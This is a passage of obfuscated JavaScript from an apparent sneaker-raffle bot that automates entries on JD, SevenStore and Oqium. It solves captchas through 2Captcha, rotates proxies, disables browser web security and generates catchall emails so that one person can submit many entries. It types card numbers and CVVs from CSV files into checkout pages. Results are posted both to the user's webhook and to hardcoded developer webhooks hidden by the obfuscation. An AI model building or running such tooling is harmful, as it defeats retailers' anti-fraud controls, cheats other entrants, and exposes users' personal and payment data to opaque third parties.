(_0x379ae1 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x571961['$eval']('#continue_button', _0x35d358 => _0x35d358['click']()), await _0x491ae3(0x1b58), await _0x571961['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x571961['$eval']('.edit_checkout.animate-floating-labels', _0x4d85b2 => _0x4d85b2['submit']()), await _0x491ae3(0x7d0);
            try {
                await _0x571961['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x10671f['name'] + ']\x20Task\x20' + (_0x379ae1 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x2a090f) {
                throw new Error('Error\x20Processing\x20Order:\x20' + _0x2a090f['message']);
            }
            var _0x5b2ea6 = await _0x344cc9(_0x4fa2dd[_0x379ae1], _0x10671f, 'dev', ![]), _0x4f2fa4 = await _0x344cc9(_0x4fa2dd[_0x379ae1], _0x10671f, 'pub', ![]);
            const _0x58d313 = {
                'succesDEVMSG': { 'embeds': [_0x5b2ea6] },
                'succesPUBMSG': { 'embeds': [_0x4f2fa4] }
            };
            try {
                _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x58d313['succesDEVMSG']), await _0x491ae3(0xc8), await _0xafb19d(_0xc8def8, _0x58d313['succesDEVMSG']), await _0x491ae3(0xc8), await _0xafb19d(_0x45ab34, _0x58d313['succesPUBMSG']);
            } catch (_0x3e6621) {
                console['log'](_0x1818b9['yellow'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0x379ae1 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3e6621));
            }
        } catch (_0xfc785) {
            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0x379ae1 + 0x1) + '\x20:\x20' + _0xfc785)), _0x2c06db = '' + _0xfc785;
            var _0x92bc8d = await _0x344cc9(kickz[_0x379ae1], _0x10671f, 'dev', !![], _0x2c06db);
            EMBEDS['errorDEV'] = { 'embeds': [_0x92bc8d] }, _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], EMBEDS['errorDEV']), await _0xafb19d(_0x51c252, EMBEDS['errorDEV']), _0x40f88d = 'yes';
        } finally {
            _0x320880 && _0x320880['close']();
            if (_0x40f88d == 'yes' && _0x10037a != 0x5) {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x10671f['name'] + ']\x20Task\x20' + (_0x379ae1 + 0x1) + '\x20:\x20Retrying')), _0x379ae1 = _0x379ae1 - 0x1, _0x10037a = _0x10037a + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x401d1c['delay'] + '\x20ms'), await _0x491ae3(_0x401d1c['delay']);
        }
    }
}
async function _0x2084d5(_0x5852f6, _0x99070a, _0x2847f4) {
    var _0x111de4 = ![], _0x576cd4 = ![];
    if (_0x401d1c['captchaKey'] == '' || _0x401d1c['captchaKey'] == undefined)
        return console['log'](_0x1818b9['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
    _0x4efd86['use'](_0x202680()), _0x4efd86['use'](_0x1fedc1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x401d1c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4f9bd9 = 0x0; _0x4f9bd9 < _0x99070a['length']; _0x4f9bd9++) {
        var _0x3b9839, _0xf17774 = [{
            'type': 'rich',
            'title': 'Succesful\x20JD\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'Product',
                    'value': '' + _0x99070a[_0x4f9bd9]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x99070a[_0x4f9bd9]['Size']
                },
                {
                    'name': 'User',
                    'value': '' + _0x54444c
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x401d1c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x431e19
                }
            ]
        }];
        const _0x2a0d27 = { 'embeds': _0xf17774 };
        _0x57f604(_0x5852f6['name'] + '\x20Task\x20' + (_0x4f9bd9 + 0x1) + '\x20/\x20' + _0x99070a['length'] + '\x20||\x20File:\x20' + _0xb37a88 + '\x20Proxies:\x20' + _0x39f01a), await _0x238b3c(_0x99070a, _0x4f9bd9);
        var _0x463d36 = await _0x344cc9(_0x99070a[_0x4f9bd9], _0x5852f6, 'dev', ![]), _0x12be57 = await _0x344cc9(_0x99070a[_0x4f9bd9], _0x5852f6, 'pub', ![]);
        const _0x3085a0 = {
            'succesDEVMSG': { 'embeds': [_0x463d36] },
            'succesPUBMSG': { 'embeds': [_0x12be57] }
        };
        if (_0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '')
            try {
                await _0xafb19d(_0x401d1c['webhook'], _0x3085a0['succesDEVMSG']);
            } catch {
            }
        await _0x491ae3(0xc8), await _0xafb19d(_0xc8def8, _0x3085a0['succesDEVMSG']), await _0x491ae3(0xc8);
        try {
            await _0xafb19d(_0x45ab34, _0x3085a0['succesPUBMSG']);
        } catch {
        }
        if (_0x99070a[_0x4f9bd9]['Email'] == '' || _0x99070a[_0x4f9bd9]['Url'] == '' || _0x99070a[_0x4f9bd9]['FirstName'] == '' || _0x99070a[_0x4f9bd9]['LastName'] == '') {
            console['log'](_0x1e4ea5() + '\x20[' + _0x461b58[taskModule]['name'] + ']\x20Task\x20' + (_0x4f9bd9 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x401d1c['useRandomProxy'] = ![])
            var _0x18d3c0 = _0x2847f4[_0x4f9bd9]['split'](':');
        else
            var _0x2067a2 = Math['round'](Math['random']() * (_0x2847f4['length'] - 0x1)), _0x18d3c0 = _0x2847f4[_0x2067a2]['split'](':');
        const _0x3c65b8 = await _0x4efd86['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x18d3c0[0x0] + ':' + _0x18d3c0[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xc1115d = await _0x3c65b8['newPage']();
            await _0xc1115d['authenticate']({
                'username': '' + _0x18d3c0[0x2],
                'password': '' + _0x18d3c0[0x3]
            }), console['log'](_0x1e4ea5() + '\x20[' + _0x5852f6['name'] + ']\x20Task\x20' + (_0x4f9bd9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xc1115d['setRequestInterception'](!![]), _0xc1115d['on']('request', _0x1f14b1 => {
                _0x1f14b1['resourceType']() === 'image' || _0x1f14b1['resourceType']() === 'font' || _0x1f14b1['resourceType']() === 'media' ? _0x1f14b1['abort']() : _0x1f14b1['continue']();
            }), await _0xc1115d['goto']('' + _0x99070a[_0x4f9bd9]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            });
            try {
                await _0xc1115d['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
            } catch {
                throw new Error('Not\x20an\x20Active\x20Raffle');
            }
            console['log'](_0x1e4ea5() + '\x20[' + _0x5852f6['name'] + ']\x20Task\x20' + (_0x4f9bd9 + 0x1) + '\x20:\x20Filling\x20Information'), await _0xc1115d['type']('#comp_firstname', '' + _0x99070a[_0x4f9bd9]['FirstName']), await _0xc1115d['waitForSelector']('#comp_lastname'), await _0xc1115d['type']('#comp_lastname', '' + _0x99070a[_0x4f9bd9]['LastName']), await _0xc1115d['waitForSelector']('#comp_email'), await _0xc1115d['type']('#comp_email', '' + _0x99070a[_0x4f9bd9]['Email']), await _0xc1115d['waitForSelector']('#comp_paypalemail'), await _0xc1115d['type']('#comp_paypalemail', '' + _0x99070a[_0x4f9bd9]['Email']), await _0xc1115d['waitForSelector']('#comp_mobile_end'), await _0xc1115d['type']('#comp_mobile_end', '' + _0x99070a[_0x4f9bd9]['Phone']), await _0xc1115d['waitForSelector']('#comp_dob'), await _0xc1115d['type']('#comp_dob', '08/09/1992'), console['log'](_0x1e4ea5() + '\x20[' + _0x5852f6['name'] + ']\x20Task\x20' + (_0x4f9bd9 + 0x1) + '\x20:\x20Choosing\x20Size');
            if (_0x99070a[_0x4f9bd9]['Size'] == 'RANDOM') {
                const _0x30108b = await _0xc1115d['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3df6fe => {
                    return _0x3df6fe['map'](_0x2bf2c5 => _0x2bf2c5['value']);
                });
                var _0x32cd3f = Math['round'](Math['random']() * (_0x30108b['length'] - 0x2));
                await _0xc1115d['select']('#shoesize', _0x30108b[_0x32cd3f + 0x1]), await _0x491ae3(0x3e8);
            } else {
                const _0x4d4152 = await _0xc1115d['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x377733 => {
                    return _0x377733['map'](_0x5a49dc => _0x5a49dc['innerText']);
                }), _0x43919f = await _0xc1115d['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x344bac => {
                    return _0x344bac['map'](_0x152118 => _0x152118['value']);
                });
                var _0x504aff = _0x99070a[_0x4f9bd9]['Size'];
                for (var _0x212ef2 = 0x1; _0x212ef2 < _0x43919f['length']; _0x212ef2++) {
                    var _0x19875d = _0x4d4152[_0x212ef2]['split']('\x20')[0x0];
                    if (_0x19875d == _0x504aff) {
                        await _0xc1115d['select']('#shoesize', _0x43919f[_0x212ef2]);
                        break;
                    } else {
                        if (_0x212ef2 + 0x1 == _0x43919f['length'])
                            throw new Error('Size\x20Not\x20Found..');
                    }
                }
            }
            await _0xc1115d['waitForSelector']('#comp_address1'), await _0xc1115d['type']('#comp_address1', _0x99070a[_0x4f9bd9]['Address1'] + '\x20' + _0x99070a[_0x4f9bd9]['HouseNumber']), await _0xc1115d['waitForSelector']('#comp_address2'), await _0xc1115d['type']('#comp_address2', '' + _0x99070a[_0x4f9bd9]['Address2']), await _0xc1115d['waitForSelector']('#comp_address2'), await _0xc1115d['type']('#comp_address3', '' + _0x99070a[_0x4f9bd9]['City']), await _0xc1115d['waitForSelector']('#comp_postcode'), await _0xc1115d['type']('#comp_postcode', '' + _0x99070a[_0x4f9bd9]['Zip']), console['log'](_0x1e4ea5() + '\x20[' + _0x5852f6['name'] + ']\x20Task\x20' + (_0x4f9bd9 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x491ae3(0x4b0), await _0xc1115d['click']('label#emailhold'), await _0x491ae3(0x5dc), await _0xc1115d['click']('#preauth_tandc_email\x20>\x20label'), await _0x491ae3(0x5dc), await _0xc1115d['click']('#submit'), await _0xc1115d['waitForSelector']('#paymentWrap'), console['log'](_0x1e4ea5() + '\x20[' + _0x5852f6['name'] + ']\x20Task\x20' + (_0x4f9bd9 + 0x1) + '\x20:\x20' + _0x1818b9['blue']('Awaiting\x20Paypal\x20Payment')), _0x3c65b8['on']('targetcreated', async _0x187060 => {
                if (_0x187060['type']() === 'page') {
                    const _0x54be82 = await _0x187060['page']();
                    async function _0x1a04f2() {
                        try {
                            await _0xc1115d['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x576cd4 = !![];
                            return;
                        } catch {
                        }
                    }
                    async function _0x5684b3() {
                        try {
                            await _0xc1115d['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x111de4 = !![];
                            return;
                        } catch {
                        }
                    }
                    _0x5684b3(), _0x1a04f2(), await _0x491ae3(0x493e0);
                }
            });
            async function _0x16be0d() {
                for (let _0x4ee2c6 = 0x0; _0x4ee2c6 < 0x12c; _0x4ee2c6++) {
                    if (_0x111de4 == !![]) {
                        console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x5852f6['name'] + ']\x20Task\x20' + (_0x4f9bd9 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '')
                            try {
                                await _0xafb19d(_0x401d1c['webhook'], _0x3085a0['succesDEVMSG']);
                            } catch {
                            }
                        await _0x491ae3(0xc8), await _0xafb19d(_0xc8def8, _0x3085a0['succesDEVMSG']), await _0x491ae3(0xc8);
                        try {
                            await _0xafb19d(_0x45ab34, _0x3085a0['succesPUBMSG']);
                        } catch {
                        }
                        return;
                    } else {
                        if (_0x576cd4)
                            throw new Error('Paypal\x20Error:\x20Target\x20closed');
                        else
                            await _0x491ae3(0x3e8);
                    }
                }
                throw new Error('Paypal\x20Error');
            }
            await _0x491ae3(0xbb8), await _0xc1115d['click']('.zoid-outlet'), await _0x491ae3(0x7d0), await _0x16be0d();
        } catch (_0x4f5f65) {
            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x5852f6['name'] + ']\x20Task\x20' + (_0x4f9bd9 + 0x1) + '\x20:\x20' + _0x4f5f65)), _0x3b9839 = '' + _0x4f5f65;
            var _0x4c6142 = await _0x344cc9(_0x99070a[_0x4f9bd9], _0x5852f6, 'dev', !![], _0x3b9839);
            _0x3085a0['errorDEV'] = { 'embeds': [_0x4c6142] }, _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x3085a0['errorDEV']), await _0xafb19d(_0x51c252, _0x3085a0['errorDEV']);
        } finally {
            _0x3c65b8 && _0x3c65b8['close'](), console['log']('Waiting\x20for\x20' + _0x401d1c['delay'] + '\x20ms'), await _0x491ae3(_0x401d1c['delay']);
        }
    }
}
async function _0x319e76(_0x3b2796, _0x5902fd, _0x419dce) {
    _0x4efd86['use'](_0x202680()), _0x4efd86['use'](_0x1fedc1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x401d1c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2159fc = 0x0; _0x2159fc < _0x5902fd['length']; _0x2159fc++) {
        _0x57f604(_0x3b2796['name'] + '\x20Task\x20' + (_0x2159fc + 0x1) + '\x20/\x20' + _0x5902fd['length'] + '\x20||\x20File:\x20' + _0xb37a88 + '\x20Proxies:\x20' + _0x39f01a);
        var _0x7f1b73 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x54444c
                },
                {
                    'name': 'Product',
                    'value': '' + _0x5902fd[_0x2159fc]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x5902fd[_0x2159fc]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x401d1c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x401d1c['version']
                }
            ]
        }];
        const _0x44ea39 = { 'embeds': _0x7f1b73 };
        await _0x238b3c(_0x5902fd, _0x2159fc);
        if (_0x5902fd[_0x2159fc]['Email'] == '' || _0x5902fd[_0x2159fc]['Password'] == '' || _0x5902fd[_0x2159fc]['FirstName'] == '' || _0x5902fd[_0x2159fc]['LastName'] == '') {
            console['log'](_0x1e4ea5() + '\x20[' + _0x3b2796['name'] + ']\x20Task\x20' + (_0x2159fc + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x5902fd[_0x2159fc]['Password'] == '' || _0x5902fd[_0x2159fc]['Password'] == undefined) && (_0x5902fd[_0x2159fc]['Password'] = 'ErehsaWonRaj1!');
        if (_0x401d1c['useRandomProxy'] = ![])
            var _0x208c1a = _0x419dce[_0x2159fc]['split'](':');
        else
            var _0x2ce195 = Math['round'](Math['random']() * (_0x419dce['length'] - 0x1)), _0x208c1a = _0x419dce[_0x2ce195]['split'](':');
        const _0x1bdaaf = await _0x4efd86['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x208c1a[0x0] + ':' + _0x208c1a[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1ac6f4 = await _0x1bdaaf['newPage']();
            await _0x1ac6f4['authenticate']({
                'username': '' + _0x208c1a[0x2],
                'password': '' + _0x208c1a[0x3]
            }), console['log'](_0x1e4ea5() + '\x20[' + _0x3b2796['name'] + ']\x20Task\x20' + (_0x2159fc + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1ac6f4['setRequestInterception'](!![]), _0x1ac6f4['on']('request', _0x15967c => {
                _0x15967c['resourceType']() === 'image' || _0x15967c['resourceType']() === 'font' || _0x15967c['resourceType']() === 'media' ? _0x15967c['abort']() : _0x15967c['continue']();
            }), await _0x1ac6f4['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x1ac6f4['goto']('' + _0x5902fd[_0x2159fc]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x1ac6f4['waitForSelector']('#btnPdpAtb'), console['log'](_0x1e4ea5() + '\x20[' + _0x3b2796['name'] + ']\x20Task\x20' + (_0x2159fc + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x5902fd[_0x2159fc]['Size']);
            const _0x1f1da1 = await _0x1ac6f4['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x25dac7 => {
                return _0x25dac7['map'](_0x40fdf4 => _0x40fdf4['innerText']);
            }), _0x26a86a = await _0x1ac6f4['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x3037b9 = ![];
            if (_0x5902fd[_0x2159fc]['Size'] == 'RANDOM') {
                var _0x1ebd46 = Math['round'](Math['random']() * (_0x26a86a['length'] - 0x1));
                await _0x26a86a[_0x1ebd46]['click']();
            } else
                for (var _0x5ea739 = 0x0; _0x5ea739 < _0x1f1da1['length']; _0x5ea739++) {
                    if (_0x1f1da1[_0x5ea739] != _0x5902fd[_0x2159fc]['Size'])
                        continue;
                    try {
                        await _0x26a86a[_0x5ea739]['click']();
                    } catch {
                        console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x3b2796['name'] + ']\x20Task\x20' + (_0x2159fc + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x3037b9 = !![];
                    }
                }
            if (_0x3037b9)
                continue;
            await _0x491ae3(0x578), await _0x1ac6f4['click']('#btnPdpAtb'), await _0x1ac6f4['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x491ae3(0x3e8), console['log'](_0x1e4ea5() + '\x20[' + _0x3b2796['name'] + ']\x20Task\x20' + (_0x2159fc + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x1ac6f4['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x1ac6f4['waitForSelector']('#email'), await _0x1ac6f4['type']('#email', _0x5902fd[_0x2159fc]['Email']), await _0x491ae3(0x226), await _0x1ac6f4['click']('#guest-submit'), await _0x491ae3(0x1b58), console['log'](_0x1e4ea5() + '\x20[' + _0x3b2796['name'] + ']\x20Task\x20' + (_0x2159fc + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1ac6f4['waitForSelector']('#firstname'), await _0x1ac6f4['type']('#firstname', _0x5902fd[_0x2159fc]['FirstName'], 0x1f4), await _0x491ae3(0x190), await _0x1ac6f4['waitForSelector']('#surname'), await _0x1ac6f4['type']('#surname', _0x5902fd[_0x2159fc]['LastName'], 0x1f4), await _0x491ae3(0x190), await _0x1ac6f4['waitForSelector']('#mobile'), await _0x1ac6f4['type']('#mobile', _0x5902fd[_0x2159fc]['Phone'], 0x1f4), await _0x491ae3(0x190), await _0x1ac6f4['click']('#enterManualDiv'), await _0x491ae3(0x5dc), await _0x1ac6f4['waitForSelector']('#address1'), await _0x1ac6f4['type']('#address1', _0x5902fd[_0x2159fc]['Address1'] + '\x20' + _0x5902fd[_0x2159fc]['HouseNumber'], 0x226), await _0x491ae3(0x384), await _0x1ac6f4['waitForSelector']('#address2'), await _0x1ac6f4['type']('#address2', '' + _0x5902fd[_0x2159fc]['Address2'], 0x226), await _0x491ae3(0x320);
            const _0x56e4b1 = await _0x1ac6f4['$$eval']('#countryselect_view3\x20>\x20option', _0x53a2cc => {
                return _0x53a2cc['map'](_0x5ef65e => _0x5ef65e['value']);
            });
            var _0x36f9ac;
            for (var _0x3a937d = 0x0; _0x3a937d < _0x56e4b1['length']; _0x3a937d++) {
                if (_0x56e4b1[_0x3a937d]['startsWith']('' + _0x5902fd[_0x2159fc]['Country'])) {
                    _0x36f9ac = _0x56e4b1[_0x3a937d];
                    break;
                }
                continue;
            }
            await _0x1ac6f4['select']('#countryselect_view3', '' + _0x36f9ac), await _0x1ac6f4['waitForSelector']('#address4'), await _0x1ac6f4['type']('#address4', '' + _0x5902fd[_0x2159fc]['City'], 0x1f4), await _0x491ae3(0x384), await _0x1ac6f4['waitForSelector']('#postcode'), await _0x1ac6f4['type']('#postcode', '' + _0x5902fd[_0x2159fc]['Zip'], 0x1f4), await _0x491ae3(0x4b0);
            const _0x29426b = await _0x1ac6f4['url']();
            console['log'](_0x1e4ea5() + '\x20[' + _0x3b2796['name'] + ']\x20Task\x20' + (_0x2159fc + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x3652bb = _0x29426b['split']('?')[0x1], _0x2edecf = await _0x1ac6f4['$']('#co_address_submit');
            await _0x2edecf['evaluate'](_0x528010 => _0x528010['click']()), await _0x491ae3(0x1388), await _0x1ac6f4['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x3652bb), console['log'](_0x1e4ea5() + '\x20[' + _0x3b2796['name'] + ']\x20Task\x20' + (_0x2159fc + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x1ac6f4['waitForSelector']('#paymentbuttons'), await _0x491ae3(0x1388), await _0x1ac6f4['click']('#paymentbuttons\x20>\x20div'), await _0x491ae3(0x1c2), await _0x1ac6f4['waitForSelector']('#card-number'), await _0x1ac6f4['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x76a3ba = await _0x1ac6f4['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x5638c0 = await _0x76a3ba['contentFrame']();
            await _0x5638c0['waitForSelector']('.InputContainer'), await _0x5638c0['click']('.InputContainer\x20>\x20input'), await _0x491ae3(0x578), await _0x1ac6f4['type']('#card-number', '' + _0x5902fd[_0x2159fc]['CreditNumber']), await _0x491ae3(0xfa), await _0x1ac6f4['type']('#card-expiry', '' + _0x5902fd[_0x2159fc]['ExpiryDate']), await _0x491ae3(0xfa), await _0x1ac6f4['type']('#card-cvc', '' + _0x5902fd[_0x2159fc]['CVV']), await _0x491ae3(0x7d0), await _0x1ac6f4['click']('#card-button'), console['log'](_0x1e4ea5() + '\x20[' + _0x3b2796['name'] + ']\x20Task\x20' + (_0x2159fc + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x1ac6f4['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x3b2796['name'] + ']\x20Task\x20' + (_0x2159fc + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0xafb19d(_0xc8def8, _0x44ea39);
            } catch {
                console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x3b2796['name'] + ']\x20Task\x20' + (_0x2159fc + 0x1) + '\x20:\x203DS\x20Failed')), _0x7f1b73[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x7f1b73[0x0]['description'] = '3DS\x20Failed', await _0xafb19d(_0x51c252, _0x44ea39);
            }
        } catch (_0x1c2c01) {
            console['log'](_0x1818b9['red'](_0x1e4ea5() + '\x20[' + _0x3b2796['name'] + ']\x20Task\x20' + (_0x2159fc + 0x1) + '\x20:\x20' + _0x1c2c01)), _0x7f1b73[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x7f1b73[0x0]['description'] = '' + _0x1c2c01, await _0xafb19d(_0x51c252, _0x44ea39);
        } finally {
            _0x1bdaaf && _0x1bdaaf['close']();
            if (_0x2159fc + 0x1 == _0x5902fd['length']) {
                console['log'](_0x1818b9['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x491ae3(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x401d1c['AfewDelay'] + '\x20ms'), await _0x491ae3(_0x401d1c['AfewDelay']);
        }
    }
}
async function _0x164a5f(_0x145998, _0x26313b, _0x4917b3, _0x50768a, _0x2775a7) {
    var _0x18728a, _0x353b6e = {}, _0x581e3c = [], _0x4dd227 = {}, _0x12a20f = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x50768a && (_0x50768a = {});
    if (_0x26313b != 'ver') {
        _0x57f604(_0x4917b3['name'] + '\x20Task\x20' + (_0x145998 + 0x1) + '\x20/\x20' + _0x50768a['length'] + '\x20||\x20File:\x20' + _0xb37a88 + '\x20Proxies:\x20' + _0x39f01a), await _0x238b3c(_0x50768a, _0x145998), _0x581e3c = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x54444c
                },
                {
                    'name': 'Size',
                    'value': '' + _0x50768a[_0x145998]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x401d1c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x431e19
                }
            ]
        }], _0x4dd227 = { 'embeds': _0x581e3c }, _0x353b6e = _0x4917b3['data'];
        _0x26313b == 'exp' ? _0x353b6e['data']['attributes']['email'] = '' + _0x50768a[_0x145998]['FirstName'] + _0x50768a[_0x145998]['LastName'] + _0x401d1c['catchall'] : _0x353b6e['data']['attributes']['email'] = '' + _0x50768a[_0x145998]['Email'];
        if (_0x50768a[_0x145998]['Size'] == 'RANDOM') {
        }
        _0x353b6e['data']['attributes']['properties']['$first_name'] = '' + _0x50768a[_0x145998]['FirstName'], _0x353b6e['data']['attributes']['properties']['$last_name'] = '' + _0x50768a[_0x145998]['LastName'], _0x353b6e['data']['attributes']['properties']['$address1'] = _0x50768a[_0x145998]['Address1'] + '\x20' + _0x50768a[_0x145998]['Address2'] + '\x20' + _0x50768a[_0x145998]['HouseNumber'], _0x353b6e['data']['attributes']['properties']['$zip'] = '' + _0x50768a[_0x145998]['Zip'], _0x353b6e['data']['attributes']['properties']['$city'] = '' + _0x50768a[_0x145998]['City'], _0x353b6e['data']['attributes']['properties']['$country'] = '' + _0x50768a[_0x145998]['Country'], _0x353b6e['data']['attributes']['properties']['Size'] = '' + _0x50768a[_0x145998]['Size'], _0x353b6e['data']['attributes']['properties']['$phone_number'] = '' + _0x50768a[_0x145998]['Phone'], _0x353b6e['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x50768a[_0x145998]['Follower'];
    }
    if (_0x401d1c['useRandomProxy'] = ![])
        var _0x2936cb = _0x2775a7[_0x145998]['split'](':');
    else
        var _0x5a8ffc = Math['round'](Math['random']() * (_0x2775a7['length'] - 0x1)), _0x2936cb = _0x2775a7[_0x5a8ffc]['split'](':');
    var _0x55e3c7 = {
        'jar': _0x596f7f,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x4917b3['url'],
        'headers': _0x4917b3['headers'],
        'body': JSON['stringify'](_0x353b6e),
        'proxy': 'http://' + _0x2936cb[0x2] + ':' + _0x2936cb[0x3] + '@' + _0x2936cb[0x0] + ':' + _0x2936cb[0x1]
    };
    return _0x26313b != 'ver' && (_0x55e3c7['url'] = _0x4917b3['url'], _0x55e3c7['headers'] = _0x4917b3['headers']), _0x26313b == 'ver' && (_0x55e3c7['method'] = 'GET'), new Promise(function (_0x5ee4a9, _0x4e1bf0) {
        callback = async (_0x3dc5, _0x2da3fb, _0x4d3d85) => {
            if (!_0x3dc5 && _0x2da3fb['statusCode'] == 0xca || !_0x3dc5 && _0x2da3fb['statusCode'] == 0xc8) {
                if (_0x26313b != 'ver') {
                    var _0x40f231 = await _0x344cc9(_0x50768a[_0x145998], _0x4917b3, 'dev', ![]), _0x323fbc = await _0x344cc9(_0x50768a[_0x145998], _0x4917b3, 'pub', ![]);
                    const _0x59c14a = {
                        'succesDEVMSG': { 'embeds': [_0x40f231] },
                        'succesPUBMSG': { 'embeds': [_0x323fbc] }
                    };
                    if (_0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '')
                        try {
                            await _0xafb19d(_0x401d1c['webhook'], _0x59c14a['succesDEVMSG']);
                        } catch {
                        }
                    await _0x491ae3(0xc8), await _0xafb19d(_0xc8def8, _0x59c14a['succesDEVMSG']), await _0x491ae3(0xc8);
                    try {
                        await _0xafb19d(_0x45ab34, _0x59c14a['succesPUBMSG']);
                    } catch {
                    }
                }
                _0x5ee4a9(console['log'](_0x1818b9['green'](_0x1e4ea5() + '\x20[' + _0x4917b3['name'] + ']\x20Task\x20' + (_0x145998 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x26313b != 'ver') {
                    var _0x301c64 = '' + _0x3dc5, _0x6f399 = await _0x344cc9(_0x50768a[_0x145998], _0x4917b3, 'dev', !![], _0x301c64), _0x2b160d = {};
                    _0x2b160d['errorDEV'] = { 'embeds': [_0x6f399] }, _0x401d1c['webhook'] != undefined && _0x401d1c['webhook'] != '' && await _0xafb19d(_0x401d1c['webhook'], _0x2b160d['errorDEV']), await _0xafb19d(_0x51c252, _0x2b160d['errorDEV']);
                }
                _0x4e1bf0(console['log'](_0x1e4ea5() + '\x20[' + _0x4917b3['name'] + ']\x20Task\x20' + (_0x145998 + 0x1) + ':\x20' + _0x3dc5));
            }
        };
        try {
